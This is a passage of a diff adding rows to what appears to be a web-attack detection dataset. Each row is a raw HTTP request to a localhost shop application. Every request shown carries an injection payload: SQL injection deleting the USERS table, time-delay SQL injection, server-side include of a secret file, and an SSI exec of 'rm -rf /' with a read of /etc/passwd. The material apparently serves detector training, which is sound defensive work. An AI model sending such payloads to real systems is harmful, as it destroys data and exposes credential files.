+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+11813,"GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2%27+DELETE+FROM+USERS HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+13676,"GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+5724,"GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2%27+DELETE+FROM+USERS HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+18519,"GET http://localhost:8080/tienda1/publico/anadir.jsp?id=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&nombre=Vino+Rioja&precio=85&cantidad=63&B1=A%F1adir+al+carrito HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+21821,"GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+13605,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1881%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&B1=Pasar+por+caja HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+2268,"GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2%27+DELETE+FROM+USERS HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+2214,"GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2%27+DELETE+FROM+USERS HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+4953,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1202%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&B1=Pasar+por+caja HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+20072,"GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2%27+DELETE+FROM+USERS HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+22306,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3858&B1=Pasar+por+caja%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+4653,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&B1=Pasar+por+caja HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+5239,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&B1=Pasar+por+caja HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+6992,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4236&B1=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+8434,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4975&B1=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+10227,"GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+15591,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+999,"GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+20986,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+5203,"GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+5774,"GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+8517,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+16680,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+16300,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+373,"GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+9773,"GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+22889,"GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+8990,"GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+19891,"GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+19401,"GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+4048,"GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+23643,"GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+5169,"GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+10761,"GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+8137,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+1404,"GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+21868,"GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+16337,"GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+21797,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%27+DELETE+FROM+USERS HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+22069,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%27+DELETE+FROM+USERS HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+15987,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%27+DELETE+FROM+USERS HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+24026,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%27+DELETE+FROM+USERS HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+20621,"GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+2080,"GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+4432,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%27+DELETE+FROM+USERS HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+23664,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%27+DELETE+FROM+USERS HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+12292,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5289&B1=Pasar+por+caja%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+11928,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%27+DELETE+FROM+USERS HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
